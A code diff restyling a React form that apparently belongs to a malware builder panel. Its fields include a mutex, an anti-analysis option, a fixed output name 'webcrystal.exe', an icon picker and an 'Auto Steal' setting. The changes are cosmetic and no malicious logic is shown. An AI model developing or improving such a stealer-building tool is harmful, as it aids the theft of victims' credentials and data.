@@ -54,24 +54,27 @@ export function BuilderForm(props: { open: boolean; mutex: string }) {
          ref={formRef}
          className={
             isOpenClass
-               ? "builderForm isOpen grid place-items-center overflow-visible opacity-100 transition-[max-height,opacity,transform,margin-top] duration-[260ms] ease-[cubic-bezier(0.25,0.1,0.25,1)] [max-height:900px] [transform:translateY(0)] mt-[14px]"
-               : "builderForm grid place-items-center overflow-hidden opacity-0 transition-[max-height,opacity,transform,margin-top] duration-[260ms] ease-[cubic-bezier(0.25,0.1,0.25,1)] [max-height:0] [transform:translateY(-6px)] mt-0"
+               ? "builderForm isOpen grid place-items-center overflow-visible opacity-100 transition-[max-height,opacity,transform,margin-top] duration-[320ms] ease-[cubic-bezier(0.25,0.1,0.25,1)] [max-height:900px] [transform:translateY(0)] mt-[14px]"
+               : "builderForm grid place-items-center overflow-hidden opacity-0 transition-[max-height,opacity,transform,margin-top] duration-[320ms] ease-[cubic-bezier(0.25,0.1,0.25,1)] [max-height:0] [transform:translateY(-6px)] mt-0"
          }
          hidden={hidden}
       >
-         <div className="builderFormInner grid w-[min(860px,92vw)] gap-[12px] rounded-[16px] border border-[rgba(255,255,255,0.14)] bg-[rgba(32,32,32,0.64)] p-[16px] shadow-[0_18px_44px_rgba(0,0,0,0.6),0_0_0_4px_rgba(255,255,255,0.05)] backdrop-blur-[8px]">
-            <div className="builderGrid grid grid-cols-2 gap-[24px]">
-               <div className="builderCol grid gap-[8px]">
-                  <BuilderField label="name">
-                     <BuilderTextInput id="buildName" placeholder="name" autoComplete="off" maxLength={25} />
+         <div className="builderFormInner relative grid w-[min(860px,92vw)] gap-[16px] rounded-[18px] border border-[rgba(255,255,255,0.10)] bg-[rgba(22,22,26,0.72)] p-[22px] shadow-[0_20px_50px_rgba(0,0,0,0.6),0_0_0_1px_rgba(255,255,255,0.04)_inset,0_1px_0_rgba(255,255,255,0.06)_inset] backdrop-blur-[12px]">
+            <div className="builderGrid grid grid-cols-2 gap-x-[32px] gap-y-[0px]">
+               {/* ── Left column ── */}
+               <div className="builderCol grid gap-[10px] content-start">
+                  <div className="text-[11px] font-bold uppercase tracking-[1.2px] text-[rgba(255,255,255,0.35)] mb-[2px]">General</div>
+
+                  <BuilderField label="Name">
+                     <BuilderTextInput id="buildName" placeholder="Build name" autoComplete="off" maxLength={25} />
                   </BuilderField>
 
-                  <BuilderField label="mutex">
-                     <BuilderTextInput id="buildMutex" value={mutex} readOnly style={{ color: "gray" }} />
+                  <BuilderField label="Mutex">
+                     <BuilderTextInput id="buildMutex" value={mutex} readOnly style={{ color: "rgba(255,255,255,0.4)" }} />
                   </BuilderField>
 
                   <BuilderField label="Comment">
-                     <BuilderTextInput id="buildComment" placeholder="comment" autoComplete="off" maxLength={10} />
+                     <BuilderTextInput id="buildComment" placeholder="Optional comment" autoComplete="off" maxLength={10} />
                   </BuilderField>
 
                   <BuilderField label="Anti-analysis">
@@ -93,7 +96,7 @@ export function BuilderForm(props: { open: boolean; mutex: string }) {
                         defaultValue="webcrystal.exe"
                         readOnly
                         tabIndex={-1}
-                        style={{ color: "gray" }}
+                        style={{ color: "rgba(255,255,255,0.4)" }}
                         className={inputFixedClass}
                      />
                   </BuilderField>
@@ -101,7 +104,13 @@ export function BuilderForm(props: { open: boolean; mutex: string }) {
                   <BuilderIconField />
                </div>
 
-               <div className="builderCol grid gap-[8px]">
+               {/* ── Vertical divider ── */}
+               <div className="absolute left-1/2 top-[22px] bottom-[22px] w-px bg-[rgba(255,255,255,0.07)]" style={{ pointerEvents: "none" }} />
+
+               {/* ── Right column ── */}
+               <div className="builderCol grid gap-[10px] content-start">
+                  <div className="text-[11px] font-bold uppercase tracking-[1.2px] text-[rgba(255,255,255,0.35)] mb-[2px]">Behavior</div>
+
                   <BuilderField variant="two" label="Auto Steal">
                      <BuilderNiceSelect
                         id="autoSteal"
@@ -190,7 +199,7 @@ export function BuilderForm(props: { open: boolean; mutex: string }) {
                className="buildProgress grid w-full place-items-center py-[10px]"
                hidden
             >
-               <div className="buildProgressInner grid h-[210px] w-[min(520px,90vw)] place-items-center rounded-[16px] border border-[rgba(255,255,255,0.14)] bg-[rgba(32,32,32,0.64)] shadow-[0_18px_40px_rgba(0,0,0,0.55),0_0_0_4px_rgba(255,255,255,0.05)] backdrop-blur-[10px]">
+               <div className="buildProgressInner grid h-[210px] w-[min(520px,90vw)] place-items-center rounded-[16px] border border-[rgba(255,255,255,0.10)] bg-[rgba(22,22,26,0.72)] shadow-[0_18px_40px_rgba(0,0,0,0.55),0_1px_0_rgba(255,255,255,0.06)_inset] backdrop-blur-[12px]">
                   <div className="grid place-items-center gap-[16px]">
                      <div
                         id="buildProgressText"
@@ -209,18 +218,17 @@ export function BuilderForm(props: { open: boolean; mutex: string }) {
                </div>
             </div>
 
-            <div className="builderFooter mt-[8px] grid justify-items-center gap-[12px]">
-               <div className="builderTabs flex w-full flex-col items-center gap-[4px]" role="tablist" aria-label="Builder tabs">
-                  <button
-                     id="createBtn"
-                     className="builderTab isActive w-[180px] cursor-pointer appearance-none rounded-[12px] border border-[rgba(255,255,255,0.14)] bg-[rgba(20,20,20,0.35)] px-[20px] py-[10px] text-center text-[14px] font-extrabold text-[rgba(255,255,255,0.92)] transition-[background,border-color,transform] duration-[140ms] hover:bg-[rgba(255,255,255,0.04)] hover:border-[rgba(255,255,255,0.18)] active:translate-y-[1px] [border-bottom:4px_solid_var(--line)]"
-                     type="button"
-                     data-tab="create"
-                     onClick={onCreate}
-                  >
-                     Create
-                  </button>
-               </div>
+            {/* ── Create button ── */}
+            <div className="builderFooter grid justify-items-center gap-[12px]">
+               <button
+                  id="createBtn"
+                  className="group relative w-[200px] cursor-pointer appearance-none overflow-hidden rounded-[14px] border border-[rgba(255,255,255,0.12)] bg-[rgba(255,255,255,0.05)] px-[24px] py-[11px] text-center text-[15px] font-extrabold tracking-[0.3px] text-[rgba(255,255,255,0.94)] transition-all duration-[180ms] hover:bg-[rgba(255,255,255,0.08)] hover:border-[rgba(255,255,255,0.20)] hover:shadow-[0_0_24px_rgba(186,85,211,0.15),0_0_0_1px_rgba(186,85,211,0.1)] active:translate-y-[1px] [border-bottom:3px_solid_var(--line)]"
+                  type="button"
+                  onClick={onCreate}
+               >
+                  <span className="relative z-10">Create</span>
+                  <span className="pointer-events-none absolute inset-0 bg-gradient-to-r from-transparent via-[rgba(186,85,211,0.06)] to-transparent opacity-0 transition-opacity duration-300 group-hover:opacity-100" />
+               </button>
             </div>
          </div>
       </div>
